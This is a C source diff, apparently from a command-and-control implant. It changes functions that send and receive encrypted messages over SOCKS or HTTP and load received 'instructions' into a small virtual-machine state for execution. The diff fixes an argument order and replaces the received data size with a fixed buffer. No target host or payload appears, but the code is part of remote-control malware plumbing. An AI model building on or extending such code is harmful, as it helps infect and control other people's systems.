@@ -22,6 +22,11 @@ typedef struct c2struct{
     void** cryptTx;
     const char* uuid;
 } C2;
+typedef struct VMstruct{
+    int isize;
+    unsigned char* instructs;
+    unsigned char* data;
+} VMstate;
 void addRxEnc(C2* conn, int n, ...){
     if(conn->cryptRx != NULL){
         free(conn->cryptRx);
@@ -71,7 +76,7 @@ int sendC2(C2 conn, const char* data, unsigned int len){
     len++;
     encrypt(conn, data2, len);
     if(conn.type == SOCKS){
-        int o = sendsock(data2, conn.pipe, len);
+        int o = sendsock(conn.pipe, data2, len);
         free(data2);
         return o;
     }else if(conn.type == HTTP){
@@ -86,32 +91,20 @@ int sendC2(C2 conn, const char* data, unsigned int len){
     }
     return -1;
 }
-typedef struct VMstruct{
-    int isize;
-    unsigned char* instructs;
-    int dsize;
-    unsigned char* data;
-} VMstate;
+
 VMstate recvC2(C2 conn){
     VMstate state;
     if(conn.type == SOCKS){
         state.isize = popsockint(conn.pipe);
+        
         if(state.isize == -1) return state;
         decrypt(conn, (char*)&state.isize, 4);
-        
         state.instructs = calloc(state.isize+1, 1);
         if(sockrecv(conn.pipe, state.instructs, state.isize) == -1) goto cleanup_socks;
         decrypt(conn, state.instructs, state.isize);
         
-        state.dsize = popsockint(conn.pipe);
-        if(state.dsize == -1) goto cleanup_socks;
-        decrypt(conn, (char*)&state.dsize, 4);
-        state.data = calloc(state.dsize+BACKLOG+1, 1) + BACKLOG;
-        if(sockrecv(conn.pipe, state.data, state.dsize) == -1){
-            free(state.data - BACKLOG);
-            goto cleanup_socks;
-        }
-        decrypt(conn, state.data, state.dsize);
+        state.data = calloc(BACKLOG+1001, 1) + BACKLOG;
+        
         return state;
     cleanup_socks:
         free(state.instructs);
@@ -149,10 +142,8 @@ VMstate recvC2(C2 conn){
             
             data += state.isize;
             
-            memcpy(&(state.dsize), data, 4);
-            data += 4;
-            state.data = calloc(state.dsize+BACKLOG+1, 1) + BACKLOG;
-            memcpy(state.data, data, state.dsize);
+            state.data = calloc(BACKLOG+1001, 1) + BACKLOG;
+            
             free(od);
             free(out);
             break;
